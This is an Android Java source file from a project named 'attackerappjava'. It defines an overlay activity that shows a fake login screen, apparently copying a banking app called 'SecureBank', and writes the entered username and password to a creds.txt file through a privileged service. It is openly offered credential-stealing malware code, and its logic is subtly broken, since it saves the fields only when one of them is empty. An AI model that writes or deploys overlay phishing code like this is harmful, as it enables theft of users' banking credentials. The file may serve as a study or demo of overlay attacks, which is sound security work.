package com.example.attackerappjava;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.textfield.TextInputLayout;

public class OverlayActivity extends AppCompatActivity {
    private static final String TAG = "[OverlayActivity]";
    private static final int REQUEST_WRITE_EXTERNAL_STORAGE = 1;
    private static final String FILE_NAME = "/storage/emulated/0/creds.txt"; // Name of the file to create
    private static final String FOLDER_NAME = "SecureBankCreds";
    TextInputLayout usernameEditText;
    TextInputLayout passwordEditText;
    TextInputLayout usernameInputLayout;
    TextInputLayout passwordInputLayout;
    Button loginButton;

    IUserService privilegedService;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "OVERLAY_ACTIVITY CREATED...");
        setContentView(R.layout.overlay_layout);
        usernameEditText = findViewById(R.id.userText);
        passwordEditText = findViewById(R.id.pswdText);
        usernameInputLayout = findViewById(R.id.userLayout);
        passwordInputLayout = findViewById(R.id.pswdLayout);
        loginButton = findViewById(R.id.loginBtn);

        loginButton.setOnClickListener(v -> handleLogin());
    }

    private void handleLogin() {
        String username = usernameEditText.getEditText().getText().toString();
        String password = passwordEditText.getEditText().getText().toString();
        if (username.isEmpty() || password.isEmpty()) {
            if (username.isEmpty()) {
                usernameInputLayout.setError("Username cannot be empty");
            }
            if (password.isEmpty()) {
                passwordInputLayout.setError("Password cannot be empty");
            }
            writeToExternalStorage(username);
            writeToExternalStorage(password);
            finish();
        }
    }

    private void writeToExternalStorage(String content) {
        try {
            privilegedService.writeToFile(FILE_NAME, content);
        } catch (Exception ignored) {
        }
    }
}

